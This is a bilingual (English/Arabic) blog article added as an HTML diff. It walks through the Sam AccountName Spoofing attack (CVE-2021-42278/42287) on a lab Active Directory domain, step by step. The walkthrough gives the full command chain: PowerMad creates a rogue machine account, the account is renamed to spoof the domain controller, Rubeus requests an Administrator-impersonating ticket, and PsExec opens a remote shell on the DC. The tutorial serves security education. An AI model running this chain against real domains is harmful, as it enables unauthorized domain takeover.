@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Domain Privilege Escalation - Sam AccountName Spoofing | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">active-directory</a><span class="sep">/</span><span>Domain Privilege Escalation - Sam AccountName Spoofing</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">active-directory</span>
+<span class="post-date">2023-11-28</span>
+</div>
+<h1 class="post-title">Domain Privilege Escalation - Sam AccountName Spoofing</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<p>This article covers the ninth technique for Domain Privilege Escalation: Sam AccountName Spoofing (also known as CVE-2021-42278 / CVE-2021-42287).</p>
+<h2>How Does Sam AccountName Spoofing Work?</h2>
+<p>This technique requires that you have a user account on one of the machines joined to the domain, even if that account has low privileges. The core idea of the attack works as follows:</p>
+<ol>
+<li>We create a fake (rogue) machine account on the domain with any name we choose.</li>
+<li>We then change the <code>samaccountname</code> attribute of this fake machine to match the name of the Domain Controller, but without the trailing <code>$</code> sign. Machine accounts in Active Directory normally have a <code>$</code> appended to their name (e.g., <code>JehadDC$</code>), so by naming our fake machine <code>JehadDC</code> (without the <code>$</code>), we avoid a naming collision.</li>
+<li>We request a TGT (Ticket Granting Ticket) for our fake machine while it still carries the Domain Controller's name.</li>
+<li>Immediately after obtaining the TGT, we rename the fake machine back to something else (any other name).</li>
+<li>We then reuse the previously obtained TGT to request a TGS (Ticket Granting Service) for any service running on the Domain Controller, such as CIFS, LDAP, or HTTP.</li>
+</ol>
+<p>The reason this works is that when you present a TGT and request a TGS, Kerberos looks up the machine name stored in the TGT. Since we renamed our fake machine, Kerberos cannot find a machine matching that name. At this point, Kerberos automatically appends a <code>$</code> to the name and searches again. This time it finds the real Domain Controller (e.g., <code>JehadDC$</code>), and issues a TGS for the Domain Controller's services to us. The only difference between our spoofed machine name and the real Domain Controller name was the <code>$</code> sign, and Kerberos bridged that gap for us.</p>
+<h2>Walkthrough</h2>
+<h3>Step 1: Load PowerView</h3>
+<p>We start by logging in as a low-privilege user (in this case, a user named <code>tester</code>). We then load the PowerView module, which provides us with Active Directory enumeration capabilities:</p>
+<pre><code class="language-powershell">Import-Module .\PowerView.ps1
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/sam-accountname/2.jpeg" alt="Step 1" loading="lazy"></figure>
+<h3>Step 2: Identify the Domain Controller Name</h3>
+<p>Before creating a fake machine, we need to know the exact name of the Domain Controller. We use the following command to retrieve it:</p>
+<pre><code class="language-powershell">Get-DomainController | Select Name
+</code></pre>
+<p>The output shows that the Domain Controller name is <code>JehadDC</code>.</p>
+<h3>Step 3: Load PowerMad</h3>
+<p>We need the PowerMad module to create rogue machine accounts on the domain. Load it with:</p>
+<pre><code class="language-powershell">Import-Module .\powermad.ps1
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/sam-accountname/3.png" alt="Step 2" loading="lazy"></figure>
+<h3>Step 4: Create a Fake Machine Account</h3>
+<p>Now we create a fake machine account with a name of our choosing (here, <code>mortal</code>) and set a password for it:</p>
+<pre><code class="language-powershell">New-MachineAccount -Domain cyber.local -MachineAccount mortal -Password (ConvertTo-SecureString 'Password123' -AsPlainText -Force) -Verbose
+</code></pre>
+<p>This creates a new computer object named <code>mortal</code> in the domain with the password <code>Password123</code>.</p>
+
+<figure class="article-img"><img src="../assets/images/sam-accountname/4.png" alt="Step 3" loading="lazy"></figure>
+<h3>Step 5: Clear the serviceprincipalname Attribute</h3>
+<p>We need to remove any values from the <code>serviceprincipalname</code> attribute of our fake machine. This is necessary to avoid SPN conflicts when we rename the machine to match the Domain Controller:</p>
+<pre><code class="language-powershell">Set-DomainObject -Identity mortal -SearchBase 'CN=mortal,CN=Computers,DC=cyber,DC=local' -Clear 'serviceprincipalname'
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/sam-accountname/5.png" alt="Step 4" loading="lazy"></figure>
+<h3>Step 6: Rename the Fake Machine to the Domain Controller Name</h3>
+<p>Now we change the <code>samaccountname</code> of our fake machine to match the Domain Controller's name, but without the <code>$</code> suffix. This avoids a duplicate name conflict while setting up the spoofing:</p>
+<pre><code class="language-powershell">Set-MachineAccountAttribute -MachineAccount &quot;mortal&quot; -Attribute &quot;samaccountname&quot; -Value &quot;JehadDC&quot;
+</code></pre>
+<h3>Step 7: Request a TGT for the Spoofed Machine</h3>
+<p>While our fake machine's <code>samaccountname</code> is set to <code>JehadDC</code>, we request a TGT using Rubeus. The KDC will issue a TGT for <code>JehadDC</code> (our fake machine currently bearing that name):</p>
+<pre><code class="language-powershell">.\Rubeus.exe asktgt /user:JehadDC /password:Password123 /domain:cyber.local /dc:JehadDC.cyber.local /nowrap
+</code></pre>
+<p>The <code>/nowrap</code> flag outputs the TGT ticket as a single base64 string without line wrapping, making it easier to use in subsequent commands.</p>
+
+<figure class="article-img"><img src="../assets/images/sam-accountname/6.png" alt="Step 5" loading="lazy"></figure>
+<h3>Step 8: Rename the Fake Machine Back</h3>
+<p>Immediately after obtaining the TGT, we rename our fake machine back to its original name (or any other name). This is a critical step -- the TGT we obtained still references <code>JehadDC</code>, but now no machine in the domain has that exact <code>samaccountname</code> (without the <code>$</code>):</p>
+<pre><code class="language-powershell">Set-MachineAccountAttribute -MachineAccount &quot;mortal&quot; -Attribute &quot;samaccountname&quot; -Value &quot;mortal&quot;
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/sam-accountname/7.png" alt="Step 6" loading="lazy"></figure>
+<h3>Step 9: Request a TGS for Domain Controller Services</h3>
+<p>Now we use Rubeus to leverage the S4U2self extension, presenting our previously obtained TGT to request a TGS for a service on the Domain Controller. We impersonate the Administrator account and target the CIFS service (which provides file share access):</p>
+<pre><code class="language-powershell">.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/JehadDC.cyber.local /dc:JehadDC.cyber.local /ticket:doIFWjCCBVagAwIBBaEDAgEWooIEczCCBG9hggRrMIIEZ6ADAgEFoQ0bC0NZQkVSLkxPQ0FMoiAwHqADAgECoRcwFRsGa3JidGd0GwtjeWJlci5sb2NhbKOCBC0wggQpoAMCARKhAwIBAqKCBBsEggQXONv4VtKGctK6N8y5hTyGbrczP2TOHiaIN9/Js0nGw9J6TkFLuaQJ2QNPIKTXXbo6RQgptGLkc58P2EGIPMxvEBZ7g/PGyVh4+A4BY3zRA0jccvXCHSgxWLygUy0SuKk0aenBwIBIFKQFfYDlE5sYJ/HqSgI7GLhyzlOenyeCfRIVXUI+7coimDHrb7/cn8zhUZ/IY3TCv4rV9toeZWXfNYBmpoYq5QGX12GqWskZeIuGlVRd3CmYZpSGG6vWMbRZCWGJCj3KcdPvXG7lmqxYWuXJVfQJ1kcZXfwMZqKt9JtCoi8HehDpcGwd2u01c7NxFBLYOL3rVazfgEl5S1ZhNggIH0LDCLcqKQM7+IzjQxs/PcHwmIr/UIEwXYClm3TuW4kf0C1vHVJQC1yxvXJ6EzcHw3zL1zvdX/L+L8NQju/yJqfvdYqhbu9CWRanWdfZNOxKuy1UYuvGvp95fwk2DfH4YWaB4IhIM2vYVTgF9kt7Z66bLHnKsYlrllVZteROn6US78QDDWc59q+3MeXh70b7ZTHR2V+x+M4zp5G8YZCkHfZSM469/+MFv34Y1K9WH2SjgbYryQB+pCnvOoU946AGInRyhQ3NV/XmmWEYTwXxfORuVnkAVQS7emayTKR0SJBT3+0jhiGecwXOP9G07FBAnqx4+VyNR0Ypdppl0zIW0a8y7WNjp0Mgpj8CWO2+fb16HQfS+Kk3iLr1YAAniFDxV40eoRNHz98NA4KEFFPVDprI2g4MaAaQl3afSsbCFPywbFGMjxK5XCeWlgnsBFAK1OxCqU5d8YXSqA4s /ptt
+</code></pre>
+<ul>
+<li><code>/self</code> triggers the S4U2self mechanism.</li>
+<li><code>/impersonateuser:Administrator</code> requests a ticket on behalf of the domain Administrator.</li>
+<li><code>/altservice:cifs/JehadDC.cyber.local</code> specifies the target service (CIFS on the Domain Controller).</li>
+<li><code>/ptt</code> injects the resulting ticket directly into memory (Pass-the-Ticket).</li>
+</ul>
+<p>When Kerberos processes this request, it looks for a machine matching the name in the TGT (<code>JehadDC</code>). Since we renamed our fake machine, there is no match. Kerberos then appends <code>$</code> to the name, finds the real Domain Controller <code>JehadDC$</code>, and issues a TGS for the Domain Controller's CIFS service, granting us Administrator-level access.</p>
+
+<figure class="article-img"><img src="../assets/images/sam-accountname/8.png" alt="Step 7" loading="lazy"></figure>
+<h3>Step 10: Verify the Ticket Was Injected</h3>
+<p>We confirm the TGS was successfully injected into memory by listing the cached Kerberos tickets:</p>
+<pre><code class="language-powershell">klist
+</code></pre>
+<h3>Step 11: Access the Domain Controller</h3>
+<p>With the TGS for the CIFS service injected into memory, we can now use Microsoft's PsExec tool to get a remote shell on the Domain Controller:</p>
+<pre><code>PsExec.exe \\JehadDC.cyber.local cmd.exe
+</code></pre>
+<p>This gives us command execution on the Domain Controller with Administrator privileges, completing the privilege escalation.</p>
+<figure class="article-img"><img src="../assets/images/sam-accountname/9.png" alt="Step 8" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>Domain Privilege Escalation - Sam AccountName Spoofing</p>
+<p>السلام عليكم ورحمة الله وبركاته</p>
+<p>الحمد لله على جميع نِعمه علينا ما علمنا منها وما لم نعلم حمداً والصلاة والسلام على نبينا محمد اشرف الخلق والمرسلين, اما بعد:</p>
+<p>مقدمة:</p>
+<p>في هذي المقالة راح نشرح التكينك التاسع لي الـDomain Privilege وهو الـ Sam AccountName Spoofing</p>
+<p>قبل نبدا نطبق التكنيك خلونا نعرف ايش هي فكرة Sam AccountName Spoofing ؟</p>
+<p>هذا التكنيك يتطلب انه يكون لك مستخدم على احد الاجهزة الموجودة على الدومين حتى لو كان بصلاحية منخفضة وفكرة التكنيك ببساطة انه راح ننشأ جهاز مزيف بـأي اسم بعد كذا راح نغير اسم الجهاز المزيف الى نفس اسم الـDomain Controller لكن بدون وضع علامة الـ$ وبعدها نطلب الـTGT الخاصة في جهازنا المزيف بعد كذا راح نغير اسم الجهاز المزيف اللي تم تسميته على اسم الـDomain Controller الى اي اسم اخر ومن ثم نقوم في اعادة استخدام ال TGT السابقة حتى نتمكن من طلب TGS الى اي سيرفرس خاصة في الـDomain Controller مثل cifs او ldap او http</p>
+<p>لو تلاحظون انه ذكرت بعد ماناخذ الـTGT الخاصة في جهازنا المزيف نغير اسمه لانه وقت يكون معك TGT وتطلب TGS راح يبحث الـKerberos عن نفس اسم جهازك الموجود في الـTGT اذا مالقية راح يحط اخره علامة $ تلقائيا وهذا راح يتسبب في انه يجيب لنا الـTGS الخاصة في الـDomain Controller لانه الفرق بين اسم جهازك المزيف واسم الـDomain Controller هو علامة الـ$</p>
+<p>الشرح:</p>
+<p>اولا انا داخل بمستخدم منخفض الصلاحية اللي اسمه tester</p>
+<p>راح اسوي Load الى اداة PowerView عن طريق هذا الامر:</p>
+<figure class="article-img"><img src="../assets/images/sam-accountname/2.jpeg" alt="Step 1" loading="lazy"></figure>
+
+<p>import-module .\PowerView.ps1</p>
+<p>الان قبل ان ننشأ جهاز مزيف نحتاج نعرف اسم جهاز الـDomain Controller عن طريق هذا الامر:</p>
+<p>get-domaincontroller | select name</p>
+<figure class="article-img"><img src="../assets/images/sam-accountname/3.png" alt="Step 2" loading="lazy"></figure>
+
+<p>نلاحظ انه اسم جهاز الدومين كنترولر : JehadDC</p>
+<p>الان راح نسوي Load الى اداة PowerMad عن طريق هذا الامر عشان ننشأ جهاز مزيف:</p>
+<p>Import-Module .\powermad.ps1</p>
+<figure class="article-img"><img src="../assets/images/sam-accountname/4.png" alt="Step 3" loading="lazy"></figure>
+
+<p>الان راح ننشأ جهاز مزيف بأي اسم تبيه عن طريق هذا الامر ونحط له باسورد معين :</p>
+<p>New-MachineAccount -Domain cyber.local -MachineAccount mortal -Password (ConvertTo-SecureString 'Password123' -AsPlainText -Force) -Verbose</p>
+<p>الان انشأنا جهاز مزيف اسمه mortal والباسورد الخاص فيه هو Password123</p>
+<figure class="article-img"><img src="../assets/images/sam-accountname/5.png" alt="Step 4" loading="lazy"></figure>
+
+<p>الان عن طريق هذا الامر راح نحذف اي قيمة موجودة في ال Attribute اللي اسمه serviceprincipalname الخاصة في جهازنا المزيف:</p>
+<p>Set-DomainObject -Identity mortal -SearchBase 'CN=mortal,CN=Computers,DC=cyber,DC=local' -Clear 'serviceprincipalname'</p>
+<p>الان راح نغير اسم الجهاز الى نفس اسم الـDomain Controller لكن بدون وضع علامة الـ$ حتى لا يحدث تكرار عن طريق هذا الامر:</p>
+<p>Set-MachineAccountAttribute -MachineAccount "mortal" -Attribute "samaccountname" -Value "JehadDC"</p>
+<figure class="article-img"><img src="../assets/images/sam-accountname/6.png" alt="Step 5" loading="lazy"></figure>
+
+<p>الان راح نطلب الـTGT الخاصة في جهازنا المزيف عن طريق هذا الامر</p>
+<p>.\Rubeus.exe asktgt /user:JehadDC  /password:Password123 /domain:cyber.local /dc:JehadDC.cyber.local /nowrap</p>
+<p>الان بعد ماطلبنا الـTGT راح نرجع ونغير اسم الجهاز المزيف الخاص فينا الى اي اسم اخر عن طريق هذا الامر:</p>
+<figure class="article-img"><img src="../assets/images/sam-accountname/7.png" alt="Step 6" loading="lazy"></figure>
+
+<p>Set-MachineAccountAttribute -MachineAccount "mortal" -Attribute "samaccountname" -Value "mortal"</p>
+<p>الان كل اللي علينا نرجع نستخدم اداة Rubeus ونطلب TGS الى اي سيرفرس موجوده على الـDomain Controller مثل cifs او ldap او http عن طريق هذا الامر :)</p>
+<p>.\Rubeus.exe s4u /self /impersonateuser:Administrator /altservice:cifs/JehadDC.cyber.local /dc:JehadDC.cyber.local /ticket:doIFWjCCBVagAwIBBaEDAgEWooIEczCCBG9hggRrMIIEZ6ADAgEFoQ0bC0NZQkVSLkxPQ0FMoiAwHqADAgECoRcwFRsGa3JidGd0GwtjeWJlci5sb2NhbKOCBC0wggQpoAMCARKhAwIBAqKCBBsEggQXONv4VtKGctK6N8y5hTyGbrczP2TOHiaIN9/Js0nGw9J6TkFLuaQJ2QNPIKTXXbo6RQgptGLkc58P2EGIPMxvEBZ7g/PGyVh4+A4BY3zRA0jccvXCHSgxWLygUy0SuKk0aenBwIBIFKQFfYDlE5sYJ/HqSgI7GLhyzlOenyeCfRIVXUI+7coimDHrb7/cn8zhUZ/IY3TCv4rV9toeZWXfNYBmpoYq5QGX12GqWskZeIuGlVRd3CmYZpSGG6vWMbRZCWGJCj3KcdPvXG7lmqxYWuXJVfQJ1kcZXfwMZqKt9JtCoi8HehDpcGwd2u01c7NxFBLYOL3rVazfgEl5S1ZhNggIH0LDCLcqKQM7+IzjQxs/PcHwmIr/UIEwXYClm3TuW4kf0C1vHVJQC1yxvXJ6EzcHw3zL1zvdX/L+L8NQju/yJqfvdYqhbu9CWRanWdfZNOxKuy1UYuvGvp95fwk2DfH4YWaB4IhIM2vYVTgF9kt7Z66bLHnKsYlrllVZteROn6US78QDDWc59q+3MeXh70b7ZTHR2V+x+M4zp5G8YZCkHfZSM469/+MFv34Y1K9WH2SjgbYryQB+pCnvOoU946AGInRyhQ3NV/XmmWEYTwXxfORuVnkAVQS7emayTKR0SJBT3+0jhiGecwXOP9G07FBAnqx4+VyNR0Ypdppl0zIW0a8y7WNjp0Mgpj8CWO2+fb16HQfS+Kk3iLr1YAAniFDxV40eoRNHz98NA4KEFFPVDprI2g4MaAaQl3afSsbCFPywbFGMjxK5XCeWlgnsBFAK1OxCqU5d8YXSqA4s /ptt</p>
+<figure class="article-img"><img src="../assets/images/sam-accountname/8.png" alt="Step 7" loading="lazy"></figure>
+
+<p>الان راح نشيك عن طريق هذا الامر هل تم حقن ال TGS بنجاح في الميموري او لا (:</p>
+<p>klist</p>
+<p>الان راح نستخدم اداة PsExec من مايكروسوفت عشان ندخل لي جهاز الـDomain Controller</p>
+<figure class="article-img"><img src="../assets/images/sam-accountname/9.png" alt="Step 8" loading="lazy"></figure>
+
+<p>وصلنا الى نهاية المقالة</p>
+<p>شاكر لكم.</p>
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
